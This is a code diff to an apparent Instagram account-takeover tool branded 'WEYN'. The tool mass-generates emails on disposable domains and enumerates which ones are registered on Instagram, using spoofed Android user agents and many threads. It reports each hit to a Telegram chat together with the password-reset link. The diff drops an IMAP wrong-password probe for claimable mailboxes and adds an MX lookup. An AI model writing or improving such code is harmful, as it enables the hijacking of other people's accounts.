@@ -1690,7 +1690,7 @@ def run_method2_web(token, chat_id, min_followers, stop_event):
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  METHOD 3  —  ULTRA-FAST EMAIL SCANNER  (original logic)
+#  METHOD 3  —  ULTRA-FAST EMAIL SCANNER  (V2 engine)
 # ══════════════════════════════════════════════════════════════════════════════
 
 _m3_hits         = 0
@@ -1713,16 +1713,16 @@ _M3_DOMAINS = ["@hi2.in", "@telegmail.com", "@mail.com", "@yopmail.com"]
 
 def _m3_generate_android_ua():
     devices = [
-        {"brand": "samsung",  "model": "SM-G973F",     "device": "beyond1",  "board": "exynos9820", "cpu": "exynos9820"},
-        {"brand": "samsung",  "model": "SM-A536B",     "device": "a53x",     "board": "s5e8825",    "cpu": "exynos1280"},
-        {"brand": "samsung",  "model": "SM-S918B",     "device": "dm1q",     "board": "kalama",     "cpu": "qcom"},
-        {"brand": "Google",   "model": "Pixel 6",      "device": "raven",    "board": "raven",      "cpu": "gs101"},
-        {"brand": "Google",   "model": "Pixel 7",      "device": "panther",  "board": "panther",    "cpu": "gs201"},
-        {"brand": "Xiaomi",   "model": "M2102J20SG",   "device": "ares",     "board": "mt6893",     "cpu": "mtk"},
-        {"brand": "Xiaomi",   "model": "Redmi Note 10","device": "sweet",    "board": "sm6150",     "cpu": "qcom"},
-        {"brand": "OnePlus",  "model": "ONEPLUS A6003","device": "OnePlus6", "board": "sdm845",     "cpu": "qcom"},
-        {"brand": "OPPO",     "model": "CPH2371",      "device": "OP4F1F",   "board": "mt6893",     "cpu": "mtk"},
-        {"brand": "HUAWEI",   "model": "ELE-L29",      "device": "HWELE",    "board": "kirin980",   "cpu": "hisilicon"},
+        {"brand": "samsung",  "model": "SM-G973F",      "device": "beyond1",  "board": "exynos9820", "cpu": "exynos9820"},
+        {"brand": "samsung",  "model": "SM-A536B",      "device": "a53x",     "board": "s5e8825",    "cpu": "exynos1280"},
+        {"brand": "samsung",  "model": "SM-S918B",      "device": "dm1q",     "board": "kalama",     "cpu": "qcom"},
+        {"brand": "Google",   "model": "Pixel 6",       "device": "raven",    "board": "raven",      "cpu": "gs101"},
+        {"brand": "Google",   "model": "Pixel 7",       "device": "panther",  "board": "panther",    "cpu": "gs201"},
+        {"brand": "Xiaomi",   "model": "M2102J20SG",    "device": "ares",     "board": "mt6893",     "cpu": "mtk"},
+        {"brand": "Xiaomi",   "model": "Redmi Note 10", "device": "sweet",    "board": "sm6150",     "cpu": "qcom"},
+        {"brand": "OnePlus",  "model": "ONEPLUS A6003",  "device": "OnePlus6", "board": "sdm845",     "cpu": "qcom"},
+        {"brand": "OPPO",     "model": "CPH2371",        "device": "OP4F1F",   "board": "mt6893",     "cpu": "mtk"},
+        {"brand": "HUAWEI",   "model": "ELE-L29",        "device": "HWELE",    "board": "kirin980",   "cpu": "hisilicon"},
     ]
     device      = random.choice(devices)
     android_ver = random.choice(["10", "11", "12", "13", "14"])
@@ -1826,91 +1826,22 @@ def _m3_check_v2(email, client):
         return ("unknown", None, None)
 
 
-_HI2_DOMAINS = {'hi2.in', 'telegmail.com', 'mail.com'}
-
-_HI2_IMAP_HOSTS = {
-    'hi2.in':       'mail.hi2.in',
-    'telegmail.com': 'mail.telegmail.com',
-    'mail.com':     'imap.mail.com',
-}
-_HI2_IMAP_FALLBACK = {
-    'hi2.in':       'imap.hi2.in',
-    'telegmail.com': 'imap.telegmail.com',
-    'mail.com':     'mail.mail.com',
-}
-
-# Words in IMAP error that mean "mailbox does NOT exist" → email is claimable
-_IMAP_AVAIL_WORDS = (
-    'no such', 'user unknown', 'unknown user', 'invalid user',
-    'user not found', 'does not exist', 'not exist',
-    'account not found', 'no account', 'nonexistent',
-    'mailbox not found', 'mailbox unavailable', 'userunknown',
-)
-# Words that mean "wrong password but account EXISTS" → email is taken
-_IMAP_TAKEN_WORDS = (
-    'authenticationfailed', 'authentication failed',
-    'invalid credentials', 'bad credentials',
-    'login failed', 'password', 'credentials rejected',
-    'auth failed',
-)
+def _m3_check_domain_mx(domain):
+    """Quick DNS MX check via Google DNS-over-HTTPS — no recaptcha, no IMAP."""
+    try:
+        r = requests.get(
+            f"https://dns.google/resolve?name={domain}&type=MX",
+            headers={'User-Agent': 'Mozilla/5.0'},
+            timeout=5
+        )
+        if r.status_code == 200:
+            return bool(r.json().get('Answer'))
+    except Exception:
+        pass
+    return False
 
 
-def _m3_email_available(email):
-    """
-    IMAP login-probe check for hi2.in / telegmail.com.
-    Attempts login with a random wrong password on port 993 (IMAPS).
-    - Server says "user unknown / no such user" → mailbox is claimable → True
-    - Server says "authentication failed / bad password" → mailbox exists → False
-    Fails open (True) on any connection / inconclusive error so no real hit is missed.
-    """
-    domain = email.split('@')[1].lower()
-    if domain not in _HI2_DOMAINS:
-        return True
-
-    username = email.split('@')[0]
-    probe_pw = 'weyn_probe_' + secrets.token_hex(6)
-
-    import imaplib
-
-    def _try_imap(host):
-        try:
-            conn = imaplib.IMAP4_SSL(host, 993, timeout=8)
-        except Exception:
-            return None  # connection refused / DNS failure
-        try:
-            conn.login(username, probe_pw)
-            # Extremely unlikely — if login succeeds the mailbox exists
-            try:
-                conn.logout()
-            except Exception:
-                pass
-            return False  # taken
-        except imaplib.IMAP4.error as exc:
-            err = str(exc).lower()
-            try:
-                conn.logout()
-            except Exception:
-                pass
-            if any(w in err for w in _IMAP_AVAIL_WORDS):
-                return True   # available
-            if any(w in err for w in _IMAP_TAKEN_WORDS):
-                return False  # taken
-            return None  # inconclusive
-        except Exception:
-            return None
-
-    primary  = _HI2_IMAP_HOSTS.get(domain)
-    fallback = _HI2_IMAP_FALLBACK.get(domain)
-
-    result = _try_imap(primary) if primary else None
-    if result is None and fallback:
-        result = _try_imap(fallback)
-
-    # None = inconclusive / unreachable → fail CLOSED (don't save emails we can't confirm)
-    return False if result is None else result
-
-
-def _m3_save_hit(token, chat_id, email, method_label="V1", username=None):
+def _m3_save_hit(token, chat_id, email, method_label="V1", username=None, has_mx=None):
     global _m3_hits, _m3_total
     domain  = email.split('@')[1]
     prefix  = email.split('@')[0]
@@ -1924,14 +1855,18 @@ def _m3_save_hit(token, chat_id, email, method_label="V1", username=None):
 
     ig_handle   = username if username else prefix
     profile_url = f"https://www.instagram.com/{ig_handle}"
+    mx_flag     = "✓" if has_mx else "?"
+
     msg = (
         f"WEYN M3 — {domain}\n"
         f"HIT #{hit_num}\n"
         f"EMAIL  : {email}\n"
         f"MASKED : {masked}\n"
         f"STATUS : REGISTERED ({method_label})\n"
+        f"DOMAIN : {mx_flag} MX valid\n"
         f"PROFILE: {profile_url}\n"
         f"RESET  : https://www.instagram.com/accounts/password/reset/\n"
+        f"SESSION: {session_id}\n"
         f"_______________________________________\n"
         f"BY ~ @jinbelowg @weyn_vouches"
     )
@@ -1952,23 +1887,12 @@ def _m3_save_hit(token, chat_id, email, method_label="V1", username=None):
 
 
 def _m3_worker(token, chat_id, stop_event):
-    global _m3_good_insta, _m3_bad_insta, _m3_bad_email, _m3_scanned
-    global _m3_taken
+    global _m3_good_insta, _m3_bad_insta, _m3_bad_email, _m3_scanned, _m3_taken
 
-    # One persistent HTTP/2 client per worker — reused across all emails
     try:
         client = httpx.Client(http2=True, timeout=10)
     except Exception:
         client = httpx.Client(timeout=10)
-
-    def _try_save(email, label, username, user_pk):
-        """Check email availability then save or count as taken."""
-        if _m3_email_available(email):
-            _m3_save_hit(token, chat_id, email, label, username)
-        else:
-            global _m3_taken
-            _m3_taken += 1
-            _web_state['taken'] = _m3_taken
 
     try:
         while not (stop_event and stop_event.is_set()):
@@ -1982,8 +1906,8 @@ def _m3_worker(token, chat_id, stop_event):
                         continue
                     _m3_used_emails.add(chosen)
 
-                domain = random.choice(_M3_DOMAINS)
-                email  = chosen + domain
+                domain_suffix = random.choice(_M3_DOMAINS)
+                email         = chosen + domain_suffix
 
                 _m3_scanned += 1
                 _web_state['scanned'] = _m3_scanned
@@ -2000,7 +1924,8 @@ def _m3_worker(token, chat_id, stop_event):
                         if v2_status == "registered":
                             _m3_good_insta += 1
                             _web_state['good'] = _m3_good_insta
-                            _try_save(email, "V1", username, user_pk)
+                            has_mx = _m3_check_domain_mx(email.split('@')[1])
+                            _m3_save_hit(token, chat_id, email, "V1", username, has_mx)
                         elif v2_status == "not_registered":
                             _m3_bad_insta += 1
                             _web_state['bad_insta'] = _m3_bad_insta
@@ -2008,14 +1933,16 @@ def _m3_worker(token, chat_id, stop_event):
                             # V2 inconclusive — trust V1
                             _m3_good_insta += 1
                             _web_state['good'] = _m3_good_insta
-                            _try_save(email, "V1", username, user_pk)
+                            has_mx = _m3_check_domain_mx(email.split('@')[1])
+                            _m3_save_hit(token, chat_id, email, "V1", username, has_mx)
 
                     elif result_v1 == "check_v2":
                         v2_status, username, user_pk = _m3_check_v2(email, client)
                         if v2_status == "registered":
                             _m3_good_insta += 1
                             _web_state['good'] = _m3_good_insta
-                            _try_save(email, "V2", username, user_pk)
+                            has_mx = _m3_check_domain_mx(email.split('@')[1])
+                            _m3_save_hit(token, chat_id, email, "V2", username, has_mx)
                         elif v2_status == "unknown":
                             _m3_bad_email += 1
                             _web_state['bad_email'] = _m3_bad_email
@@ -2058,12 +1985,12 @@ def run_method3_web(token, chat_id, stop_event):
         'recent_hits': [], 'tg_status': '', 'tg_error': '',
     })
 
-    NUM_WORKERS = 500
+    NUM_WORKERS = 200
     try:
         pool = ThreadPoolExecutor(max_workers=NUM_WORKERS)
         _m3_pool = pool
         futures = [
-            pool.submit(_m3_worker, token, chat_id, stop_event, year_choice)
+            pool.submit(_m3_worker, token, chat_id, stop_event)
             for _ in range(NUM_WORKERS)
         ]
         for future in as_completed(futures):
